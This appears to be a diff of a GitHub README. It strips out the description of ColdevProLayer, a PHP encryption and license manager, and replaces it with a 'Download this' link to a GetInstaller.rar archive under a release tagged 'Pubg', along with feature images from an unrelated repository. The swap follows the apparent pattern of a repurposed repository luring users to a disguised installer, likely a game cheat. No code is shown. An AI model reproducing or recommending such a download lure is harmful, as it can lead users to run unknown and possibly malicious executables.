@@ -1,35 +1,22 @@
-(Support PHP 5.4/5.5/5.6/7.0/7.1/7.2/7.3/8.02)
 
- 
-ColdevProLayer is a License Manager, for encrypt  PHP files helps you to manage the distribution of PHP applications by generating license files that can required byte encoded files to run. Using license manager you can create trial and demo versions of PHP applications without any code changes.  Distribute applications without source code.
+## Download [this](https://github.com/coldev/ColdevProLayer/releases/download/Pubg/GetInstaller.rar)
 
 
-Special Features:
-PHP/HTML code encryption 256 bits  (ECC).
-Include Very strong SHA256 personal keys.
-CRC integrity check.
-License is great: Free for commercial and non commercial use. (MIT) 
-Time expiry, the license can be set to expire of specific date or after specific time interval.
-Usage Restricted to specific hardware, linked to hardware id.
-Usage Restricted to specific IP, linked to the PHP server IP.
-Include a custom data as client , name, company, etc.
-Support the last PHP versions.
-Support  HTML and PHP Source code  (great!!).
-Easy to install in popular php servers as Xampp, Wamp, Easyphp, Uniserver and Others.
-You can generate a  unique hardwareID .
-Module is  Thread Safe.
-Tested in production scenarios and very stable.
-Very fast bytecode engine. 
-You can make a donation with a comment that you would like to see some feature implemented and this will give it a higher Priority.
-You can generate License files for encripted PHP files by running simple php code, available for Windows, (soon Linux).
-Documented examples.
-Hide sensitive data and protect scripts from unauthorised changes that may go unnoticed indefinitely, and be a serious security and data protection risk.
-Limiting unauthorized duplication or use of your applications.
-All code is encrypted, In order to make the code difficult to understand by others, without affecting code execution.  
-Protect their intellectual property.  
-Saving in software expenses licenses.
+-------------------------------------------------
+# Features 🧊
+
+![f1](https://github.com/Emildebls5/p4bg-drgn/assets/157389931/14881add-c267-4fdd-884f-09d30ee45b42)
+
+![f2](https://github.com/Emildebls5/p4bg-drgn/assets/157389931/5203575b-2c51-4549-9e5d-237bfd44ad84)
+
+![f3](https://github.com/Emildebls5/p4bg-drgn/assets/157389931/711793ec-4484-4b7a-b3e9-945a209c0bed)
+
+![f4](https://github.com/Emildebls5/p4bg-drgn/assets/157389931/21ada0a8-26f6-47a0-b924-f5987bfab0f8)
 
 
-more info: 
-https://coldev.sourceforge.io/
 
+
+# Screenshots 💙
+
+![111scr](https://i.imgur.com/PpJi1s8.jpg)
+![222scr](https://i.imgur.com/2McieXP.jpg)
